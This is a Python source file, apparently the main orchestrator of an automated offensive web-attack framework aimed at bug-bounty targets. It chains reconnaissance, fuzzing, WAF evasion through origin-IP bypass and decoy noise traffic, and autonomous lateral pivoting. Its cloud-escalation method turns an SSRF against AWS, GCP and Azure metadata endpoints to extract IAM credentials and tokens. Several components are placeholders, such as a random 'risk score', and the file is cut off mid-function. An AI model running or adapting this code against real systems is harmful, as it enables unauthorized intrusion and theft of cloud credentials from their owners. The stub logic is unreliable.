import json
import asyncio
import os
import random
import gc
import time
from typing import Any, List, Dict, Optional, Tuple, Set, Callable
from aura.core.brain import AuraBrain
from aura.core.stealth import StealthEngine, AuraSession
from aura.core.telemetry import Telemetry
from aura.core.provisioner import AuraProvisioner
from aura.core.context import MissionContext, AuraConfig, FeatureFlags
from aura.core.storage import AuraStorage
from aura.core.oast_server import OASTManager
from aura.core.registry import get_registry
from aura.modules.submitter import BountySubmitter
from aura.modules.profit_engine import ProfitEngine
from aura.core.vuln_intel import CVEProvider
from aura.core.nexus_bridge import NexusBridge, BurpController
from aura.core.omega_crawler import OMEGACrawler
from aura.modules.safety import ScopeManager
from aura.core.exploit_chain import ChainOfThoughtExploiter
from aura.core.memory import DeepMemoryFuzzer
from aura.modules.leaks import LeakProber
from aura.modules.threat_intel import ThreatIntel
from aura.modules.bounty import BountyHunter
from aura.modules.banner_grabber import BannerGrabber
from aura.modules.pivoting import AuraLink
# from aura.modules.dorks_intel import DorksIntel
# from aura.modules.takeover import SubdomainTakeoverHunter
from aura.modules.recon_pipeline import ReconPipeline
from aura.modules.secret_hunter import SecretHunter
from aura.modules.power_stack import PowerStack
from aura.modules.poc_engine import PoCEngine
from aura.modules.logic_engine import AILogicEngine
from aura.modules.synthesizer import ProtocolSynthesizer
from aura.modules.lateral_engine import LateralEngine
from aura.modules.neural_forge import NeuralForge
from aura.modules.ghost_ops import GhostOps
from aura.modules.scope_checker import ScopeChecker
from aura.modules.cors_hunter import CorsHunter
from aura.modules.wayback_scanner import WaybackScanner
from aura.modules.bypass_engine import BypassEngine
from aura.core.markdown_reporter import MarkdownReporter
from aura.modules.race_condition_hunter import RaceConditionHunter
from aura.modules.evidence_dumper import EvidenceDumper
from aura.modules.artifact_builder import ArtifactBuilder
from aura.core.weaponization_engine import WeaponizationEngine
from aura.core.apex_sentinel import ApexSentinel
from aura.core.shadow_state import ShadowStateModeler
from aura.core.bounty_reporter import BountyReporter
from aura.core.fleet_manager import FleetManager
from aura.core.mission_hunter import MissionHunter
from aura.core.sentinel_watch import SentinelWatch
from aura.core.zenith_reporter import ZenithReporter
from aura.ui.formatter import ZenithUI, console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.panel import Panel
from rich.console import Console
from rich.table import Table
from urllib.parse import urlparse, urljoin
from aura.core.metrics import METRICS

# v38.0: Semantic Analysis Engines
from aura.modules.semantic_ast_engine import SemanticASTAnalyzer, ASTVisualizer
from aura.modules.stateful_logic_fuzzer import StatefulLogicFuzzer, WorkflowBuilder
from aura.core.injector import get_container

import logging
logger = logging.getLogger("aura.orchestrator")

class MirrorSimulator:
    def __init__(self, brain):
        self.brain = brain
        self.alert_threshold = 0.7

    async def predict_exposure(self, activity_log: list) -> dict:
        console.print("[bold blue][[MIRROR] MIRROR] Simulating Defensive Response Analysis...[/bold blue]")
        risk_score = random.random()
        return {
            "alert_triggered": risk_score > self.alert_threshold,
            "predicted_signatures": ["SQLi_Pattern_A", "Rapid_Dir_Bust"],
            "recommended_shift": "Switch to WSS Tunneling" if risk_score > 0.5 else "Stay Course"
        }

class DeceptionOrchestrator:
    def __init__(self, swarm):
        self.swarm = swarm

    async def deploy_distraction(self, target: str):
        console.print(f"[bold yellow][[MASQUERADE] DECEPTION] Deploying Noise Workers to distract security for {target}...[/bold yellow]")
        await asyncio.sleep(0.5)
        console.print("[dim yellow][+] Noise Swarm active: Engaging WAF with generic 'noisy' signatures.[/dim yellow]")

class SovereignDecisionEngine:
    def __init__(self, brain, db):
        self.brain = brain
        self.db = db

    async def autonomous_mission_planning(self, domain: Optional[str] = None) -> List[Any]:
        console.print("[bold purple][[BRAIN] SOVEREIGN] Analyzing Global Battlefield for Autonomous Target Selection...[/bold purple]")
        if domain:
            selected = [domain]
        else:
            selected = [domain or "unknown"]
        console.print(f"[bold purple][[CROWN]] Decision: Primary Objective set to: {selected[0]}[/bold purple]")
        return selected

from aura.modules.api_reaper import APIReaper
from aura.modules.frontend_deconstructor import FrontendDeconstructor
from aura.modules.graphql_reaper import GraphQLReaper

class NeuralOrchestrator:
    """
    v40.0: Enterprise Re-architected Orchestrator.
    Now uses Dependency Injection and Dynamic Module Discovery.
    """
    def __init__(self, container: Any = None, whitelist: Optional[List[str]] = None, blacklist: Optional[List[str]] = None, broadcast_callback: Optional[Any] = None, context: Optional[MissionContext] = None):
        self.container = container or get_container()
        self.persistence = self.container.persistence
        self.telemetry = self.container.telemetry
        self.registry = self.container.registry
        self.context = context or MissionContext(target_url="unknown")
        
        # Dependency Mappings (Legacy support)
        self.db = self.persistence
        self.storage = self.persistence
        self.broadcast_callback = broadcast_callback or self._default_remote_broadcast
        
        # Infrastructure
        self.brain = AuraBrain()
        self.stealth = StealthEngine()
        self.session = AuraSession(self.stealth)
        self.scope = ScopeManager(whitelist=whitelist, blacklist=blacklist)
        self.oast = OASTManager.get_instance()
        
        # Standardized Engines via Registry
        self.scanner     = self._init_engine("aura_scanner", stealth=self.stealth)
        self.exploiter   = self._init_engine("aura_exploiter")
        self.dast        = self._init_engine("aura_dast")
        self.singularity = self._init_engine("aura_singularity")
        self.vision      = self._init_engine("aura_vision")
        self.leaks       = self._init_engine("leaks")
        self.recon_pipeline = self._init_engine("recon_pipeline")
        self.secret_hunter = self._init_engine("secret_hunter")
        
        # Extended/Specialized Engines (Transitioning to Registry)
        self.vuln_intel   = self._init_engine("cve_provider") or CVEProvider()
        self.intel        = self._init_engine("threat_intel", stealth=self.stealth) or ThreatIntel(stealth=self.stealth)
        self.bounty       = self._init_engine("bounty_hunter") or BountyHunter()
        self.link         = self._init_engine("aura_link") or AuraLink()
        self.banner_grabber = self._init_engine("banner_grabber") or BannerGrabber()
        self.power_stack  = self._init_engine("power_stack", stealth=self.stealth) or PowerStack(stealth=self.stealth)
        self.poc_engine    = self._init_engine("poc_engine", stealth=self.stealth) or PoCEngine(stealth=self.stealth)
        self.logic_engine  = self._init_engine("ai_logic_engine") or AILogicEngine(self.session)
        self.synthesizer   = self._init_engine("protocol_synthesizer") or ProtocolSynthesizer(self.brain)
        self.lateral       = self._init_engine("lateral_engine") or LateralEngine(self.brain)
        self.dorks_intel   = self._init_engine("dorks_intel") 
        self.takeover_hunter = self._init_engine("subdomain_takeover") 
        self.nuclei_engine = self._init_engine("nuclei_engine") 
        self.submitter     = self._init_engine("bounty_submitter") 
        self.profit_engine = self._init_engine("profit_engine") 
        self.weapon_engine = self._init_engine("weaponization_engine") 
        self.ssti_engine   = self._init_engine("ssti_engine") 
        self.smuggling_engine = self._init_engine("smuggling_engine") 
        self.ws_oauth_engine = self._init_engine("ws_oauth_engine")
        self.fleet_manager = self._init_engine("fleet_manager") or FleetManager()
        self.mission_hunter = self._init_engine("mission_hunter") or MissionHunter()
        self.sentinel_watch = self._init_engine("sentinel_watch") or SentinelWatch(self.persistence.findings)
        self.nexus_bridge  = self._init_engine("nexus_bridge") or NexusBridge()
        self.burp_bridge   = BurpController()  # v25.2: Burp Suite REST API integration
        self.omega_crawler = self._init_engine("omega_crawler") or OMEGACrawler(proxy_url="http://127.0.0.1:8081")
        self.apex          = self._init_engine("apex_sentinel") or ApexSentinel(self.brain)
        self.shadow_state  = self._init_engine("shadow_state_modeler") or ShadowStateModeler(self.brain)
        self.bounty_reporter = self._init_engine("bounty_reporter") or BountyReporter(self.brain, platform=self.context.config.bounty_platform)
        self.cot           = self._init_engine("exploit_chain") or ChainOfThoughtExploiter(self.brain)
        self.logic_fuzzer  = self._init_engine("logic_fuzzer")

        self.reporter  = ZenithReporter(self.brain)
        self.mirror    = MirrorSimulator(self.brain)
        self.deception = DeceptionOrchestrator(self.stealth.swarm)
        self.sovereign = SovereignDecisionEngine(self.brain, self.persistence)
        
        self.telemetry.log_audit("SYSTEM", "NeuralOrchestrator", "Core engines initialized via registry.")
        
        self.active_missions = []
        self.stats = {"findings": 0, "urls": 0}
        self.knowledge_base = {
            "redirects": [],
            "sinks": [],
            "idor_vectors": [],
            "auth_flows": []
        }
        self._guard_active = False
        self.mission_state = {}
        self._active_tasks = set()
        self.dast_semaphore = asyncio.Semaphore(10)
        self.sing_semaphore = asyncio.Semaphore(5)
        self.scope_checker  = ScopeChecker()
        self.oast_task = None
        self.current_campaign = None
        self.plugins = []
        
        # Dynamic Modules
        self.heavy_weapons = self._init_engine("heavy_weapons", db=self.db)
        self.cloud_recon   = self._init_engine("aura_cloud_recon", db=self.db)
        self.ghost_ops     = self._init_engine("ghost_ops", orchestrator=self)
        self.api_reaper    = self._init_engine("api_reaper")
        self.frontend_miner = self._init_engine("frontend_deconstructor")
        self.gql_reaper    = self._init_engine("graphql_reaper")

        self._load_plugins()
        console.print("[bold green][+][/] NeuralOrchestrator initialized with IOC Container.")

    def _init_engine(self, engine_id: str, **kwargs) -> Any:
        """Helper to initialize an engine from registry with dependencies."""
        import os
        debug_mode = os.getenv("AURA_DEBUG", "").lower() == "true"
        
        engine_cls = self.registry.get_engine(engine_id)
        if engine_cls:
            try:
                # Inject persistence, telemetry, and brain automatically
                return engine_cls(persistence=self.persistence, telemetry=self.telemetry, brain=self.brain, **kwargs)
            except Exception as e:
                if debug_mode:
                    self.telemetry.log_error("ORCHESTRATOR", f"Dependency Error in {engine_id}: {e}")
                    from rich.console import Console
                    Console().print(f"[dim yellow][Graceful Fallback] {engine_id} missing library/dependency: {e}.[/dim yellow]")
        else:
            if debug_mode:
                self.telemetry.log_error("ORCHESTRATOR", f"Failed to initialize engine: {engine_id} (Not found in registry)")
                from rich.console import Console
                Console().print(f"[dim yellow][Graceful Fallback] Engine '{engine_id}' not found in registry. Using Mock.[/dim yellow]")

        # Return a MockEngine to prevent cascade failure
        class MockEngine:
            def __init__(self, eid): 
                self.engine_id = eid
                self.engine_name = eid
                self._status = "mocked"
            
            def __getattr__(self, name):
                """Return an async function that returns appropriate empty value."""
                if name.startswith("__") and name.endswith("__"):
                    raise AttributeError(f"MockEngine has no attribute {name}")
                async def noop(*args, **kwargs):
                    # Return empty list for scan/spider/run methods, None otherwise
                    if 'scan' in name or 'spider' in name or 'run' in name:
                        return []
                    return None
                return noop
            
            async def run(self, *args, **kwargs): return []
            async def setup(self, *args, **kwargs): pass
            async def teardown(self, *args, **kwargs): pass
            
            # Additional common methods as async
            async def stop_veritas(self): pass
            async def scan(self, *args, **kwargs): return []
            async def spider(self, *args, **kwargs): return []
            async def probe(self, *args, **kwargs): return []
        return MockEngine(engine_id)

    def _track_task(self, coro, name: str = "engine_task") -> asyncio.Task:
        """
        Create an asyncio Task and register it for lifecycle tracking.
        Tasks auto-remove from the set when they complete (done callback).
        This ensures close() can cancel ALL running tasks without leaking ghost processes.
        """
        task = asyncio.create_task(coro, name=name)
        self._active_tasks.add(task)
        task.add_done_callback(self._active_tasks.discard)
        return task

    async def _broadcast(self, content: Any, type: str = "status", level: str = "info", icon: str = "info", data: Optional[Dict[str, Any]] = None):
        """Unified broadcast interface with remote bridge support."""
        message = {
            "type": type,
            "level": level,
            "content": content,
            "icon": icon,
            "data": data,
            "timestamp": time.time()
        }
        if self.broadcast_callback:
            if asyncio.iscoroutinefunction(self.broadcast_callback):
                await self.broadcast_callback(message)
            else:
                self.broadcast_callback(message)

    async def _default_remote_broadcast(self, message: Dict[str, Any]):
        """Bridge CLI events to the background Nexus API server."""
        import httpx
        try:
            async with httpx.AsyncClient() as client:
                await client.post("http://127.0.0.1:8000/api/broadcast", json=message, timeout=1.0)
        except Exception:
            pass

    async def _process_exploit_chain(self, domain: str, finding_type: str, content_obj: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        campaign_id = getattr(self, 'current_campaign', None)
        if "redirect" in str(finding_type).lower():
            self.knowledge_base["redirects"].append(content_obj.get("evidence_url"))
        elif "ssrf" in str(finding_type).lower() or "lfi" in str(finding_type).lower():
            self.knowledge_base["sinks"].append(content_obj.get("evidence_url"))
            
            # v38.0: Cloud Metadata Predator - Autonomous Escalation
            if "169.254.169.254" in str(content_obj.get("payload", "")) or "metadata" in str(content_obj.get("payload", "")):
                await self._cloud_metadata_escalation(domain, content_obj)
                
        elif "idor" in str(finding_type).lower():
            self.knowledge_base["idor_vectors"].append(content_obj.get("evidence_url"))
        if self.knowledge_base["redirects"] and self.knowledge_base["sinks"]:
            redirect_url = self.knowledge_base["redirects"][0]
            sink_url = self.knowledge_base["sinks"][0]
            chained_payload = f"{sink_url}?url={redirect_url}"
            console.print(f"[bold red][[ANCHOR]] EXPLOIT CHAIN DETECTED: Combining SSRF sink with Open Redirect for Network Bypass![/bold red]")
            chain_finding = {
                "type": "Critical Chain: SSRF via Open Redirect Bypass",
                "content": f"Aura synthesized a exploit chain: SSRF via Open Redirect.",
                "evidence_url": chained_payload,
                "severity": "CRITICAL"
            }
            self.db.add_finding(domain, chain_finding, chain_finding["type"], campaign_id=campaign_id)
            await self.lateral.pivot_from_finding(chain_finding)
            return chain_finding
        if any(k in str(finding_type).lower() for k in ["ssrf", "rce", "lfi"]):
            await self.lateral.pivot_from_finding(content_obj)
        
        # v3.5 OMEGA: Sentient Oracle Synthesis for Chaining
        await self._perform_oracle_chaining_synthesis(domain)
        
        # v4.0 Beginner Enablement: Mentor Engine
        if self.context.flags.beginner_mode:
            await self._display_mentor_guide(content_obj)
        
        return None

    async def _display_mentor_guide(self, finding: dict):
        """v4.0: Calls the brain to explain a finding to the user."""
        try:
            guide = await asyncio.to_thread(self.brain.generate_triage_guide, finding)
            if guide:
                console.print(Panel(
                    f"[bold cyan]Technical Explanation:[/bold cyan] {guide.get('technical_explanation')}\n\n"
                    f"[bold red]Business Impact:[/bold red] {guide.get('business_impact')}\n\n"
                    f"[bold yellow]Manual Verification:[/bold yellow]\n" + 
                    "\n".join([f"  - {step}" for step in guide.get('manual_verification_steps', [])]) + "\n\n"
                    f"[bold green]Mentor Tip:[/bold green] {guide.get('educational_tip')}",
                    title="🎓 AURA MENTOR",
                    border_style="cyan"
                ))
        except Exception as e:
            logger.debug(f"Mentor guide generation failed: {e}")

    async def _cloud_metadata_escalation(self, domain: str, finding: dict):
        """
        [CLOUD PREDATOR] v38.0: Autonomous IAM Credential Extraction.
        Pivots from SSRF to full metadata harvest (AWS/GCP/Azure).
        """
        console.print(f"[bold red][[SATELLITE] CLOUD PREDATOR] SSRF Detected on Cloud Infrastructure. Pivoting to IAM Escalation...[/bold red]")
        
        target_url = finding.get("url")
        param = finding.get("param")
        if not target_url or not param: return
        
        # Metadata targets for extraction
        escalation_targets = [
            ("AWS IAM Role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("AWS User Data", "http://169.254.169.254/latest/user-data"),
            ("GCP Service Account", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            ("Azure Identity", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
        ]
        
        for name, meta_url in escalation_targets:
            console.print(f"[dim yellow][*] Attempting to extract {name}...[/dim yellow]")
            
            # Construct the escalation request
            from urllib.parse import urlparse, parse_qs, urlencode
            parsed = urlparse(target_url)
            qs = parse_qs(parsed.query)
            qs[param] = [meta_url]
            new_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
            
            try:
                # Add Metadata-Flavor header for GCP/Azure
                headers = {"Metadata-Flavor": "Google", "Metadata": "true"}
                resp = await self.session.get(new_url, headers=headers)
                
                if resp and resp.status_code == 200:
                    # If AWS IAM, we need to fetch the role name first, then the creds
                    if "iam/security-credentials/" in meta_url and not resp.text.strip().startswith("{"):
                        role_name = resp.text.strip()
                        meta_url += role_name
                        qs[param] = [meta_url]
                        new_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
                        resp = await self.session.get(new_url, headers=headers)
                    
                    if resp and "AccessKeyId" in resp.text or "access_token" in resp.text:
                        console.print(f"[bold red][[FIRE] CLOUD TAKEOVER] SUCCESS: Extracted {name} Credentials![/bold red]")
                        takeover_finding = {
                            "type": f"Cloud Infrastructure Takeover: {name} Leak",
                            "severity": "CRITICAL",
                            "content": f"Successfully extracted sensitive cloud credentials via SSRF: {resp.text[:200]}...",
                            "evidence_url": new_url,
                            "confirmed": True
                        }
                        self.db.add_finding(domain, takeover_finding, takeover_finding["type"], "CRITICAL")
            except Exception as e:
                logger.debug(f"Cloud escalation failed for {name}: {e}")

    async def _perform_oracle_chaining_synthesis(self, domain: str):
        """v38.0 OMEGA: Feed minor findings to Brain for critical chaining discovery."""
        campaign_id = getattr(self, 'current_campaign', None)
        
        # Collect recent minor findings from DB or local state
        # For simplicity in this implementation, we'll summarize findings from the current session
        # In a real scenario, this would query the DB for all LOW/INFO findings.
        
        summary_prompt = f"""
        Analysis for domain: {domain}
        Recent Findings: {json.dumps(self.knowledge_base)}
        
        Perform 'Oracle Synthesis': Determine if these minor (INFO/LOW/MEDIUM) findings can be chained together 
        to achieve a CRITICAL impact (e.g., SSRF + Internal Host discovery = Internal API Access).
        
        If a chain is possible, describe it and provide the 'chained_payload'.
        Format: json object with 'chain_name', 'logic', 'severity', 'chained_payload'.
        Return null if no viable chain is found.
        """
        
        try:
            raw = await asyncio.to_thread(self.brain.reason_json, summary_prompt)
            chain = json.loads(raw) if isinstance(raw, str) else raw
            
            if chain and chain.get("chained_payload"):
                console.print(f"[bold red][[ORACLE] ORACLE] Sentient Discovery: {chain.get('chain_name')}![/bold red]")
                console.print(f"[dim red]Logic: {chain.get('logic')}[/dim red]")
                
                chain_finding = {
                    "type": f"Sentient Chain: {chain.get('chain_name')}",
                    "content": chain.get("logic"),
                    "evidence_url": chain.get("chained_payload"),
                    "severity": chain.get("severity", "CRITICAL")
                }
                
                self.db.add_finding(domain, chain_finding, chain_finding["type"], chain_finding["severity"], campaign_id)
                
                # Autonomously pivot to the new mission
                console.print(f"[bold purple][[ROCKET]] Autonomous Pivot: Launching targeted mission for {chain.get('chained_payload')}...[/bold purple]")
                await self.lateral.pivot_from_finding(chain_finding)
                
        except Exception as e:
            logger.debug(f"Oracle Synthesis failed: {e}")

    async def _desperation_maneuver(self, targets: list[str]) -> list[str]:
        """v38.0: Aggressive forensic fuzzing for targets with hidden API surfaces."""
        all_new = set()
        for t in targets:
            # Trigger the scanner in 'Aggressive' mode
            new_paths = await self.scanner.force_fuzz(t, swarm_mode=True)
            all_new.update(new_paths)
            # Add common SPA routes manually as a safety net
            SPA_ROUTES = [
                "/rest/user/login", "/api/v1/user", "/rest/products/search",
                "/admin", "/api/v1/config", "/graphql", "/api/v1/status"
            ]
            for r in SPA_ROUTES:
                all_new.add(urljoin(t, r))
        return list(all_new)

    async def _memory_watchdog(self):
        try:
            while True:
                await asyncio.sleep(600)
                gc.collect()
        except asyncio.CancelledError:
            pass

    async def _resource_guard_monitor(self):
        """v3.0 Omega: Background watchdog to prevent resource exhaustion."""
        self._guard_active = True
        console.print("[bold green][[SHIELD]] OMEGA Guard: Resource Watchdog active via Veritas.[/bold green]")
        while self._guard_active:
            try:
                health = self.nexus_bridge.get_health()
                if health.get("result"):
                    ram_mb = health["result"].get("ram_usage_mb", 0)
                    if ram_mb > 2500: # 2.5GB RAM Threshold for emergency kill
                        console.print(f"[bold red][[WARNING]] AURA GUARD: High RAM usage ({ram_mb}MB). Executing emergency cleanup...[/bold red]")
                        self.nexus_bridge.veritas.call("guard_kill_chromes")
                await asyncio.sleep(60)
            except Exception as e:
                logger.debug(f"Resource Guard poll error: {e}")
                await asyncio.sleep(60)

    async def activate_sentient_mode(self, domain: str) -> None:
        console.print(f"[bold red][[OMEGA] OMEGA] Activating Sentient Singularity Mode for {domain}...[/bold red]")
        exposure = await self.mirror.predict_exposure(self.session.latency_log)
        if exposure["alert_triggered"]:
            await self.deception.deploy_distraction(domain)
        objectives = await self.sovereign.autonomous_mission_planning(domain)
        console.print("[bold green][[DNA]] Genetic Payload Mutator active.[/bold green]")

    async def broadcast(self, content: Any, type: str = "status", level: str = "info", icon: str = "info-circle", **kwargs: Any) -> None:
        if self.broadcast_callback:
            msg = {"content": content, "type": type, "level": level, "icon": icon}
            msg.update(kwargs)
            if asyncio.iscoroutinefunction(self.broadcast_callback): await self.broadcast_callback(msg)
            else: self.broadcast_callback(msg)

    def _save_mission_state(self, domain: str, step: str, findings_count: int, urls_count: int) -> None:
        stats = {"findings": findings_count, "urls": urls_count}
        self.db.save_mission_state(domain, step, stats, self.mission_state)

    def _load_plugins(self) -> None:
        import os, importlib.util
        plugins_dir = os.path.join(os.path.dirname(__file__), "..", "plugins")
        if not os.path.exists(plugins_dir): return
        for file in os.listdir(plugins_dir):
            if file.endswith(".py") and file not in ["__init__.py", "base.py"]:
                try:
                    module_name = file[:-3]
                    spec = importlib.util.spec_from_file_location(module_name, os.path.join(plugins_dir, file))
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    from aura.plugins.base import AuraPlugin
                    for attr in dir(module):
                        cls = getattr(module, attr)
                        if isinstance(cls, type) and issubclass(cls, AuraPlugin) and cls is not AuraPlugin:
                            self.plugins.append(cls())
                except Exception: pass

    async def close(self):
        """v25.0 OMEGA: Graceful framework shutdown."""
        console.print("[dim cyan][*] NeuralOrchestrator: Initiating graceful shutdown...[/dim cyan]")
        
        # Ghost Process Elimination
        if hasattr(self, '_active_tasks'):
            for task in self._active_tasks:
                if not task.done():
                    task.cancel()
        
        try:
            if hasattr(self, 'session'):
                # AuraSession might be using curl_cffi or aiohttp
                if hasattr(self.session, 'close'):
                    res = self.session.close()
                    if asyncio.iscoroutine(res): await res
            if self.oast_task and not self.oast_task.done():
                self.oast_task.cancel()
                try: await self.oast_task
                except asyncio.CancelledError: pass
            console.print("[bold green][OK] Framework shutdown complete.[/bold green]")
        except Exception as e:
            console.print(f"[dim red][!] Shutdown warning: {e}[/dim red]")

    async def _phase_preflight(self, domain: str, status: Any) -> Tuple[Optional[str], Optional[str], Optional[str], bool]:
        if self.context.flags.clinic_mode:
            ZenithUI.clinic_info("Phase 0: Pre-Flight", "This phase checks if the target is alive and determines its IP. If a firewall is detected, Aura attempts to find the 'Origin IP' to bypass it.")
        ZenithUI.phase_banner("Phase 0: Stealth Pre-Flight Recon", domain, icon="⚡")
        status.update(f"[bold cyan]Initializing pre-flight telemetry for {domain}...")
        target_url = f"https://{domain}"
        original_domain = domain
        try:
            resp = await self.session.get(target_url, timeout=30)
            is_live = True
            recon_domain = domain
            if self.context.config.smart_bypass and resp and resp.status_code in [403, 401]:
                origin_ips = await self.stealth.hunt_origin_ip(domain)
                if origin_ips:
                    best_ip = origin_ips[0]
                    self.context.custom_headers["Host"] = domain
                    domain = best_ip
                    target_url = f"https://{best_ip}"
                    resp_bypass = await self.session.get(target_url, timeout=30, verify=False)
                    if resp_bypass and resp_bypass.status_code < 400:
                        console.print("[bold green][[SUCCESS]] Firewall Bypass Verified.[/bold green]")
        except Exception:
            try:
                target_url = f"http://{domain}"
                resp = await self.session.get(target_url, timeout=30)
                is_live = True
            except Exception: return None, None, None, False
        return domain, target_url, original_domain, is_live

    async def _phase_intel(self, recon_domain: str | None, target_ip: str | None, status, campaign_id):
        ZenithUI.phase_banner("Phase 1: Gathering OSINT", recon_domain, icon="[RADAR]")
        await self._broadcast(recon_domain, type="stats", data={"active_mission": f"Recon: {recon_domain}", "progress": 15})
        await self._broadcast(f"Gathering OSINT intelligence for {recon_domain}...", type="intel", icon="satellite-dish")
        status.update(f"[bold magenta]Querying threat intelligence databases...")
        intel_data = {}
        
        async def _shodan():
            try: return "shodan", await self.intel.query_shodan(target_ip) if target_ip else None
            except: return "shodan", None
            
        async def _censys():
            try: return "censys", await self.intel.query_censys(target_ip) if target_ip else None
            except: return "censys", None

        async def _virustotal():
            try: return "virustotal", await self.intel.query_virustotal(recon_domain)
            except: return "virustotal", None

        async def _leaks():
            try: return "leaks", self.leaks.probe_domain(recon_domain)
            except: return "leaks", None

        async def _dorks():
            try: return "dorks", await self.dorks_intel.run_dorks(recon_domain)
            except: return "dorks", None

        async def _security_trails():
            try: return "securitytrails", await self.intel.query_securitytrails(recon_domain)
            except: return "securitytrails", None

        results = await asyncio.gather(_shodan(), _censys(), _virustotal(), _leaks(), _dorks(), _security_trails(), return_exceptions=True)
        for r in results:
            if isinstance(r, tuple) and r[1]: 
                intel_data[r[0]] = r[1]
                # Log findings to DB if they are lists of dicts (like dorks/leaks)
                if r[0] in ["dorks", "leaks"] and isinstance(r[1], list):
                    for finding in r[1]:
                        self.db.add_finding(recon_domain, finding, finding.get("type", "OSINT Leak"), finding.get("severity", "MEDIUM"), campaign_id)

        return intel_data

    async def _phase_recon(self, recon_domain: str | None, target_ip: str | None, intel_data, status, campaign_id, swarm_mode):
        if self.context.flags.clinic_mode:
            ZenithUI.clinic_info("Phase 2: Active Recon", "Here we map the infrastructure. We look for hidden subdomains and services that might be vulnerable or forgotten by the owner.")
        ZenithUI.phase_banner("Phase 2: Active Reconnaissance", recon_domain, icon="[SATELLITE]")
        await self._broadcast(recon_domain, type="stats", data={"progress": 30})
        await self._broadcast(f"Mapping infrastructure & subdomains for {recon_domain}...", type="recon", icon="map-location-dot")
        status.update(f"[bold blue]Mapping infrastructure and subdomains...")
        recon_data = await self.recon_pipeline.run(
            recon_domain, 
            target_ip, 
                    intel_data=intel_data, 
                    stealth_mode=getattr(self, "effective_fast_mode", False),
                    beginner_mode=self.context.flags.beginner_mode
                )
        all_subs = recon_data.get("subdomains", [])
        if all_subs: await self.takeover_hunter.run(all_subs)
        
        # v38.0: Active Secret Hunting on discovered URLs
        found_urls = [r["url"] for r in recon_data.get("urls", []) if "url" in r]
        if found_urls:
            status.update(f"[bold yellow]SecretHunter: Scanning JS/Config files in {len(found_urls)} URLs...")
            secrets = await self.secret_hunter.hunt_js_files(found_urls)
            if secrets:
                for s in secrets:
                    self.db.add_finding(recon_domain, s, s["type"], s["severity"], campaign_id)
                    
        return recon_data

    async def _phase_discovery(self, target_url, recon_domain, recon_data, status, campaign_id):
        ZenithUI.phase_banner("Phase 3: Deep Discovery", target_url, icon="[SEARCH]")
        await self._broadcast(target_url, type="stats", data={"progress": 50})
        await self._broadcast(f"Starting Deep Discovery on {target_url}...", type="discovery", icon="magnifying-glass-nodes")
        status.update(f"[bold yellow]Crawling and discovering endpoints...")
        
        # v38.0: Dual Crawler Strategy (AuraScanner + OMEGACrawler)
        spidered_urls, discovered_forms = await self.scanner.recursive_spider(target_url, max_depth=1)
        
        try:
            status.update(f"[bold cyan]OMEGACrawler: Deconstructing SPA/Lazy-loaded routes...")
            omega_results = await self.omega_crawler.crawl(target_url)
            if omega_results:
                omega_urls = [r.get("url") for r in omega_results if r.get("url")]
                spidered_urls.extend(omega_urls)
                console.print(f"[bold green][[OK]] OMEGACrawler discovered {len(omega_urls)} additional routes.[/bold green]")
        except Exception as e:
            console.print(f"[dim red][!] OMEGACrawler skipped: {e}[/dim red]")
            
        return list(set([target_url] + spidered_urls)), discovered_forms

    async def _phase_0day_radar(self, recon_domain, tech_stack, campaign_id):
        """v40.0 OMEGA: Global Threat Feed 0-Day PoC check."""
        if not tech_stack or self.context.flags.fast_mode: return []
        
        ZenithUI.phase_banner("Phase 3.9: 0-Day Radar Scanning", recon_domain, icon="[RADAR]")
        try:
            exploits = await self.intel.query_github_0days(tech_stack)
            for exp in exploits:
                finding = {
                    "type": f"0-Day Radar Hit: {exp['tech']} Exploit",
                    "severity": "CRITICAL",
                    "content": f"A potential 0-day PoC for {exp['tech']} was found on GitHub: {exp['repo']}\n{exp['description']}",
                    "evidence_url": exp["repo"],
                    "confirmed": False
                }
                self.db.add_finding(recon_domain, finding, finding["type"], "CRITICAL", campaign_id)
            return exploits
        except Exception as e:
            logger.debug(f"0-Day Radar failed: {e}")
            return []

    async def _phase_deconstruction(self, target_url, recon_domain, recon_data, status, campaign_id):
        ZenithUI.phase_banner("Phase 3.5: Deconstruction Doctrine", target_url, icon="🏗️")
        status.update(f"[bold blue]Dissecting frontend and APIs...")
        all_findings = []
        endpoints_to_fuzz = []
        
        # 1. Webpack Unpacker (Frontend Deconstructor)
        try:
            from aura.modules.frontend_deconstructor import FrontendDeconstructor
            webpack_engine = FrontendDeconstructor(target=target_url)
            webpack_findings = await webpack_engine.run()
            all_findings.extend(webpack_findings)
            hidden_routes = [f["value"] for f in webpack_findings if "Endpoint" in f.get("type", "")]
            for r in hidden_routes:
                endpoints_to_fuzz.append({
                    "method": "GET", 
                    "path": r, 
                    "fuzz_params": ["id", "q", "page"], 
                    "fuzz_types": ["sqli", "xss", "path_traversal", "ssrf"]
                })
        except Exception as e:
            hidden_routes = []
            console.print(f"[dim red]Webpack Unpacker error: {e}[/dim red]")

        # 2. API Reaper
        try:
            from aura.modules.api_reaper import APIReaper
            # Pass hidden_routes to the API Reaper
            api_engine = APIReaper(target=target_url, discovered_endpoints=hidden_routes)
            api_findings = await api_engine.run()
            all_findings.extend(api_findings)
            for ep in getattr(api_engine, 'endpoints', []):
                # Fix: In api_reaper.py, ep['params'] is a dictionary {name: val}, not a list of dicts.
                params = ep.get("params", {})
                params_dict = {}
                fuzz_param_names = []
                
                if isinstance(params, dict):
                    params_dict = {k: v for k, v in params.items()}
                    fuzz_param_names = list(params.keys())
                
                if fuzz_param_names or ep.get("body_schema"):
                    endpoints_to_fuzz.append({
                        "method": ep["method"],
                        "path": ep["path"],
                        "params": params_dict,
                        "data": ep.get("body_schema", {}) if isinstance(ep.get("body_schema"), dict) else {},
                        "fuzz_params": fuzz_param_names,
                        "fuzz_types": ["sqli", "xss", "path_traversal", "negative", "boolean_toggle"]
                    })
        except Exception as e: console.print(f"[dim red]API Reaper error: {e}[/dim red]")
        except Exception as e: console.print(f"[dim red]Webpack Unpacker error: {e}[/dim red]")
        
        # 3. GraphQL Reaper
        try:
            from aura.modules.graphql_reaper import GraphQLReaper
